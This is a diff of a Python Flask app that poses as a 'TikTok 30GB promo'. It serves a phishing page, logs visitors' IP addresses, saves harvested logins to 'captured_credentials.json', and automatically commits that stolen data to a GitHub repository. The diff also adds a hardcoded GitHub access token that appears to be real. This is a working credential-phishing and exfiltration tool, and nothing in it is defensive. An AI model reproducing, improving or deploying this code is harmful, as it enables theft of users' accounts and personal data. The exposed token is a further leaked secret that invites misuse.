@@ -1,5 +1,5 @@
 # =============================================================================
-# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB (FULL WORKING)
+# TIKTOK 30GB PROMO – AUTO‑COMMIT TO GITHUB (NO ENV, HARDCODED TOKEN)
 # GitHub: AliHamza-lab/hackme
 # =============================================================================
 
@@ -13,12 +13,14 @@ from flask import Flask, request, render_template_string, abort, redirect
 from github import Github, GithubException
 
 # -------------------- CONFIGURATION --------------------
+# 🔴 REPLACE THIS WITH YOUR NEW VALID GITHUB TOKEN (starts with ghp_)
 GITHUB_TOKEN = "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"
+
 REPO_NAME = "AliHamza-lab/hackme"
-GITHUB_BRANCH = "main"          # will also try master automatically
+GITHUB_BRANCH = "main"          # change to "master" if needed
 
 VIEW_SECRET = "changeme123"
-PUBLIC_URL = os.environ.get('PUBLIC_URL', '')
+PUBLIC_URL = ""                  # optional: set to your Render URL for self-ping
 
 DATA_FILE = "captured_credentials.json"
 VISITORS_FILE = "visitors.json"
@@ -28,7 +30,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 app = Flask(__name__)
 
-# ==================== HTML TEMPLATES (FULL) ====================
+# ==================== HTML TEMPLATES (same as before) ====================
 PROMO_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -358,8 +360,8 @@ PHISH_HTML = '''
 
 # ==================== GITHUB AUTO‑COMMIT ====================
 def commit_to_github(file_path, data):
-    if not GITHUB_TOKEN:
-        logger.warning("No GitHub token – skipping commit")
+    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
+        logger.warning("❌ No valid GitHub token provided. Please replace 'YOUR_NEW_GITHUB_TOKEN_HERE' with a real token.")
         return False
 
     branches_to_try = [GITHUB_BRANCH, "master", "main"]
@@ -421,7 +423,7 @@ def log_visitor(ip, ua):
     logger.info(f"👤 Visitor logged: {ip}")
     threading.Thread(target=commit_to_github, args=(VISITORS_FILE, visitors)).start()
 
-# ==================== SELF‑PING ====================
+# ==================== SELF‑PING (optional) ====================
 def keep_alive():
     if not PUBLIC_URL:
         return
@@ -472,6 +474,8 @@ def test_github():
     key = request.args.get('key', '')
     if key != VIEW_SECRET:
         abort(403)
+    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
+        return {"status": "error", "error": "GitHub token not set or still placeholder"}, 500
     try:
         g = Github(GITHUB_TOKEN)
         repo = g.get_repo(REPO_NAME)
@@ -514,6 +518,8 @@ def health_check():
 # ==================== MAIN ====================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
+    if not GITHUB_TOKEN or GITHUB_TOKEN == "YOUR_NEW_GITHUB_TOKEN_HERE":
+        logger.warning("⚠️  GitHub token is missing or still placeholder. Auto-commit will not work.")
     threading.Thread(target=keep_alive, daemon=True).start()
     logger.info(f"🚀 Starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
